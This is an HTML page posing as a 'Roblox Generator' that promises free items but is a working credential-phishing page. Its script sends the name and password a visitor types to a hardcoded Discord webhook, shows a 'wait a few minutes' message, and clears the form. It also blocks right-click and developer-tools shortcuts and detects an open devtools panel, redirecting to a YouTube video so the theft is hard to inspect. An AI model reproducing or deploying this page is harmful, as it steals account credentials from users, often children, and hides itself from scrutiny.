<!DOCTYPE html>
<html>
<head>
<title>Roblox Generator</title>

<style>
body{
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  background:#2b2d31;
  font-family:Arial;
}

.box{
  background:#1e1f22;
  padding:40px;
  border-radius:10px;
  text-align:center;
  color:white;
}

input{
  padding:10px;
  width:220px;
  border:none;
  border-radius:6px;
  margin-bottom:15px;
}

button{
  padding:12px 25px;
  background:#5865F2;
  border:none;
  border-radius:6px;
  color:white;
  font-size:16px;
  cursor:pointer;
}

button:hover{
  background:#4752c4;
}

#status{
  margin-top:15px;
  color:red;
  font-weight:bold;
}
</style>

</head>

<body>

<div class="box">
<h2>Send Info</h2>

<input id="username" type="text" placeholder="Name"><br>
<input id="password" type="text" placeholder="Password"><br>
<input id="amount" type="text" placeholder="Amount"><br>

<button onclick="send()">Generate</button>

<p id="status"></p>
</div>

<script>

// SEND TO WEBHOOK
function send(){

let username = document.getElementById("username").value;
let password = document.getElementById("password").value;
let amount = document.getElementById("amount").value;

let msg = `Name: ${username}\nPassword: ${password}\nAmount: ${amount}`;

fetch("https://discord.com/api/webhooks/1481721107819266070/DHpjBSD7BGtQzH8KLhRyVEQpYbgdtOFLyTOCUpKPu8GXvprtxlX_HOQj_JTVgFbq4sJ9",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body: JSON.stringify({
content: msg
})
});

document.getElementById("status").textContent = "Wait a few minutes to get it";

document.getElementById("username").value="";
document.getElementById("password").value="";
document.getElementById("amount").value="";
}


// BLOCK RIGHT CLICK
document.addEventListener("contextmenu", function(e){
e.preventDefault();
window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";
});


// BLOCK DEVTOOLS KEYS
document.addEventListener("keydown", function(e){

if(e.key==="F12"){
window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";
}

if(e.ctrlKey && e.shiftKey && e.key.toLowerCase()==="i"){
window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";
}

if(e.ctrlKey && e.key.toLowerCase()==="u"){
window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";
}

if(e.ctrlKey && e.shiftKey && e.key.toLowerCase()==="c"){
window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";
}

});


// DETECT DEVTOOLS OPEN
setInterval(function(){

if(window.outerWidth-window.innerWidth>160 || window.outerHeight-window.innerHeight>160){

window.location.href="https://www.youtube.com/shorts/QWbRqEHH5Ng";

}

},1000);

</script>

</body>
</html>
